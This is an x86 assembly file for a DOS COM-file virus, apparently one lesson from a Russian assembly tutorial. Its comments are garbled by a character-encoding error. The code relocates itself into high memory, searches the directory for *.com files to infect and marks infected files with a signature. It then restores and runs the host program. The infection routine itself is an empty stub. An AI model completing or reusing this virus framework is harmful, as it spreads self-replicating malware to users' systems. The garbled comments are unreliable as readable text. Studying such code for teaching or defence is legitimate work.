
;              VIRUS17.ASM - �ணࠬ�� � ����� � 017

; (�) ����᪨� �ࠢ� �� 䠩��-�ਫ������ �ਭ������� ����� �����
; "��ᥬ����? �� ����! �稬�� �ணࠬ��஢��� ��� MS-DOS"
; ����: ����譨��� ���� ����ᠭ�஢�� (e-mail: Assembler@Kalashnikoff.ru)
;	 http://www.Kalashnikoff.ru

; --- ��ᥬ���஢���� (����祭�� *.com 䠩��) ---
;�� �ᯮ�짮����� MASM 6.11 - 6.13:
;ML.EXE virus17.asm /AT

;�� �ᯮ�짮����� TASM:
;TASM.EXE virus17.asm
;TLINK.EXE virus17.obj /t/x


.286
CSEG segment
assume cs:CSEG, ds:CSEG, es:CSEG, ss:CSEG
org 100h

Begin:
       jmp Init ; ��室�� �� ��楤��� ���樠����樨 

;�� ���� ��ப�, 㪠�뢠�騥 �, �� �ணࠬ�� 㦥 ��ࠦ���
;����� ��������, �� �� ����� ��ப�� ����� �� ������ �������� �����.
;��� ����� ������!
  db 77h, 88h, 99h

;       === ��楤��� ࠡ��� � 䠩���� ===

; --- ����⨥ 䠩�� ��� ����� ---
; �室:  DX - ���� � 䠩�� � ASCIIZ
; ��室: Handle, BX - ����� 䠩��
Open_file proc
     mov ax,3D02h	;���뢠�� 䠩� ��� �⥭��/�����
     mov dx,1Eh		;DX 㪠�뢠�� �� ��� ���������� 䠩�� � DTA
     int 21h
     mov Handle,ax	;���࠭塞 ����� 䠩��
     mov bx,ax
     ret

Handle dw 0FFFFh	;��६����� ��� �࠭���� ����� 䠩��
Open_file endp

; --- �����⨥ 䠩�� ---
; �室:  Handle - ����� ����⮣� 䠩��
; ��室: ��祣�
Close_file proc
     cmp Handle,0FFFFh	;��� ������� 䠩���?
     je No_close	;����� ��室�� (����뢠�� ��祣�!) 

     mov bx,Handle	;����뢠�� 䠩�...
     mov ah,3Eh
     int 21h

No_close:
   ret
Close_file endp

; --- ���� ��ࢮ�� 䠩�� ---
Find_first proc
      mov ah,4Eh	;�饬 ���� 䠩� �� ��᪥ (Mask_file)
      xor cx,cx		;��ਡ��� ����� (CX=0)
      mov dx,offset Mask_file ;���� ��᪨ � DS:DX
      int 21h		;������ (�᫨ ��諨 䠩� *.com � ⥪�饬 ��⠫���)
			;��� 䠩�� ��室���� �� ����� 0BF00:001Eh,
			;�.�. �� ᬥ饭�� 30...
   ret
Mask_file db '*.com',0	;��᪠ ��� ���᪠ (⮫쪮 COM-䠩��)
Find_first endp

; --- ���� ᫥����� 䠩��� ---
Find_next proc
      xor dx,dx		;DS:DX 㪠�뢠�� �� DTA
      xor cx,cx		;��ਡ��� �����
      mov ah,4Fh
      int 21h		;������ � DTA ��室���� ���ଠ��
			;� ᫥���饬 ��������� 䠩��
   ret
Find_next endp

; --- ��ࠦ���� 䠩�� ---
Infect_file proc
      clc

   ret
Infect_file endp



; === ��楤�� ���樠����樨 ����� ===
Init:
       call Get_IP		;����稬 ᬥ饭��, ��� �� ᥩ�� ��室����
Get_IP:
       pop ax			;������ � AX - ᬥ饭��
       sub ax,offset Get_IP	;���⥬ �� ���� ॠ��� ����, ��� �� �㤥�
				;��室����� � ᥣ���� 0BF00h
				;����稬 ࠧ��� 䠩��-"�����", �᫨ ��� ���,
				;� AX �㤥� ࠢ�� 0

       push 0BF00h
       pop es			;ES - ᥣ����, �㤠 �㤥� ��६���� ��� �����,

       mov di,offset Open_file	;DI - ᬥ饭�� (���� ᠬ�� ��ࢮ� ��楤��� )
       mov si,di
       add si,ax		;SI ������ ᮤ�ঠ�� �������� ���� (ᬥ饭��),
				;�.�. �� ���� �� � ᥣ���� "䠩��-�����"...

       mov cx,offset Finish-100h ;�.�. CX = ����� ��襣� ����� � �����
       rep movsb		;������ � ����� ��� ����� ��襣� �����

;����ᥬ � �⥪ ᬥ饭�� (Lab_return+AX) � ᥣ���� (CS) ������ �� �����...
       mov bx,offset Lab_return
       add bx,ax		;�.�. ��� �� �����⢥��� ����ᨬ ���� ������
       push cs			;��� ������� retf
       push bx

;����ᥬ � �⥪ ���� ��� ���室� � ���� �����:
;  * ᥣ���� - 0BF00h
;  * ᬥ饭�� - Lab_jmp
       mov bx,offset Lab_jmp	;�������筮 ���᪠�������...
       add bx,ax
       push 0BF00h
       push bx

;��������!
;� �⥪� ��室���� ���� ᫥���饩 ��⪨, ⮫쪮 �ᯮ�������� � ��㣮�
;ᥣ����, � ������: 0BF00h.
;�� �⮬� ����� ��室���� ��⪠ Lab_jmp (�. ᫥������ ��ப� ).

;������ ��३��� �� ���� Lab_jmp, �ᯮ�������� � ᥣ���� 0BF00h,
;�ᯮ���� ������ retf, ����� ����� �� �⥪� 㪠����� ��� ᥣ���� �
;ᬥ饭�� (0BF00h:Lab_jmp+AX) � "��룭��" �� ����.
       retf


; ������ �� 㦥 � ������ ��࠭�. ������, � �⥪� ��室���� ���� ������ ��
; ���� Lab_return, �� � ᥣ���� �ணࠬ��-"�����"
Lab_jmp:

;��� � �� � "��룭㫨" � �।��饩 ��ப�! ����� CS ⥯���
;ࠢ�� 0BF00h.

       push cs		;����ந� ॣ���� DS
       pop ds

       mov ah,1Ah	;��⠭���� DTA ��� ���᪠ 䠩���
       xor dx,dx	;�� ��⠭���������� �� �� ����, ����� ᮤ�ন���
       int 21h		;� ॣ����� DS:DX. � �⫠�稪� ��ᬮ���,
			;�� ��室���� � �����, �� ������ 㪠�뢠�� �����
			;ॣ�����, �.�. DS:DX...

       call Find_first	;�饬 ���� 䠩�
       jc Nomore_files	;��� COM-䠩��� - �� ��室 

Inf_file:
       call Infect_file	;��諨 - �஡㥬 ��ࠧ���
       jnc Nomore_files	;������� ��ࠧ��� - ��室�� 

       call Find_next	;�� 㤠���� ��ࠧ��� - �饬 ᫥���騩
       jnc Inf_file	;��諨 �� ���� COM-䠩�; �஡㥬 ��ࠧ���... 


;�믮����� ᢮� ��吝�� ࠡ���. ��� ��।����� �ࠢ����� 䠩��-"���⢥";
;�㦭� ����⠭����� ��� ���� ���� ����, ����� �࠭����� � ��६�����
;First_bytes 
Nomore_files:
      mov si,offset First_bytes ;DS:SI - �� ���ᨢ �� ��� ᫮�
      mov di,100h	;ES:DI - �㤠 ��ଥ��� ��ப� (���� ����)
      push ss		;SS ᮤ�ন� ᥣ���� 䠩��-�����, �����
      pop es		;�㦭� ����㧨�� � ES
      mov cx,6		;6 ���� ��६�頥�: DS:SI = ES:DI
      rep movsb

;"����-���⢠" ����⠭����� � ����� (�筥�, ��� ���� ���� ����).
;������ ��୥��� � ᥣ���� �ணࠬ��-"�����", �.�. �㤠, ��� ��
;�뫨 ����砫쭮. ���?
;�ᯮ����, �� � �⥪� �࠭���� ᬥ饭�� � ᥣ���� ��� ������:

;mov bx,offset Lab_return
;add bx,ax ;�.�. ��� �� �����⢥��� ����ᨬ ���� ������ ���
;push cs   ;������ retf
;push bx

;������� retf, ��� ��� 㦥 �����⭮, ����� �� �⥪� ᬥ饭�� (Lab_return+AX)
;� ᥣ���� (CS) � ��३��� �� �⮬� �����. ��� � ���� 䮪��!
       retf


;������ �� ����� � ᥣ���� ��ࠦ����� �ணࠬ�� ("��룭㫨" � �।��饩
;��ப� �������� retf)... 
Lab_return:
       push cs		;����⠭���� DS (ES 㦥 � ���浪�!)
       pop ds

       mov ah,1Ah	;����⠭���� DTA
       mov dx,80h
       int 21h

       mov ax,100h	;��।��� �ࠢ����� "䠩��-���⢥" ��� ⠪�� ��࠭��
       jmp ax		;ᯮᮡ��. �.�. jmp 100h


; === ����� ===
;����� (First_bytes) �࠭���� ���� ����� "䠩��-�����".
;�᫨ �� ���� ����� �����, � �� 㬮�砭�� ����稬:
;nop (90h)
;nop (90h)
;nop (90h)
;nop (90h)
;int 20h (0CDh, 20h)
;�⮣�: 6 ����
; ���� �� ���� - jmp �� ��� �����, ����� �� �����⢥��� �������
;                    �� ��ࠦ���� �����-����� �ணࠬ��.
; ���� �� ���� - ��⪠ ⮣�, �� 䠩� 㦥 ��ࠦ�� ��訬 ����ᮬ
;                    � ��� �㤥�: 77h, 88h, 99h
First_bytes db 4 dup (90h), 0CDh, 20h

Finish equ $	;��⪠ ���� �ணࠬ��-�����

CSEG ends
end Begin